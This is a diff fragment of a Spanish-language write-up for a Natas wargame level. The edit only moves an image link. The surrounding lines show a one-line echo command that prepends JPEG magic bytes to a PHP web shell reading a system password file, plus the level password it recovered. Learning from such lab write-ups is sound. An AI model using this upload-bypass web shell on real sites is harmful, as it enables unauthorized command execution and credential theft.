@@ -5,7 +5,11 @@ echo -e "\xff\xd8\xff\xe0\n<?php echo shell_exec('cat /etc/natas_webpass/natas14
 ```
 Para crearlo tenemos que usar el x para decirle que es un hexadecimal y el magicbyte de jpg
 Creando este archivo vamos a hacer lo mismo que el nivel anterior, vamos a subirlo y despues cambiar el formato de archivo desde el f12
-![](../../../images/Pasted%20image%2020260422142632.png)
+
+
+![](../../images/Pasted%20image%2020260422142632.png)
+
+
 Hacemos lo mismo de ingresar a la ruta de imagen que nos da y nos da nuestra contraseña que en este caso sería:
 ``` zsh
 z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
